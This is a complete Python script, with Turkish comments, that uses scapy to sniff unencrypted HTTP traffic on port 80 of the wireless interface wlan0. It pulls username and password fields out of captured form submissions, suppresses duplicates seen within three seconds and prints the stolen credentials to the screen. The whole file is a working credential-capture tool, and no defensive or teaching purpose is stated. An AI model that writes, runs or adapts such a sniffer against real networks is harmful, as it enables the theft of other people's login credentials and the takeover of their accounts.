from scapy.all import sniff, TCP, Raw
import re
import urllib.parse
import time

# Son yakalanan veriyi ve zamanını hafızada tutmak için global değişkenler
last_captured_signature = ""
last_captured_time = 0

def process_packet(packet):
    global last_captured_signature, last_captured_time
    
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            if "username=" in payload and "password=" in payload:
                
                user_match = re.search(r"username=([^&]*)", payload)
                pass_match = re.search(r"password=([^&]*)", payload)

                if user_match and pass_match:
                    username = urllib.parse.unquote(user_match.group(1))
                    password = urllib.parse.unquote(pass_match.group(1))
                    
                    # --- TEKİLLEŞTİRME MANTIĞI ---
                    # Şu anki yakalanan veri için bir imza oluştur
                    current_signature = f"{username}:{password}"
                    current_time = time.time()

                    # Eğer bu imza, son 3 saniye içinde yakalananla aynıysa --> YAZDIRMA (Atla)
                    if current_signature == last_captured_signature and (current_time - last_captured_time) < 3:
                        return

                    # Yeni bir veriyse ekrana bas ve hafızayı güncelle
                    last_captured_signature = current_signature
                    last_captured_time = current_time

                    print("\n" + "*"*40)
                    print(f"Kullanıcı Adı : {username}")
                    print(f"Şifre         : {password}")
                    print("*"*40)

        except Exception:
            pass

def start_sniffing(iface):
    print(f"[*] {iface} üzerinde dinleniyor. Tekrarlayan paketler filtrelendi.")
    sniff(iface=iface, store=0, prn=process_packet, filter="tcp port 80")

if __name__ == "__main__":
    interface_name = "wlan0"
    start_sniffing(interface_name)

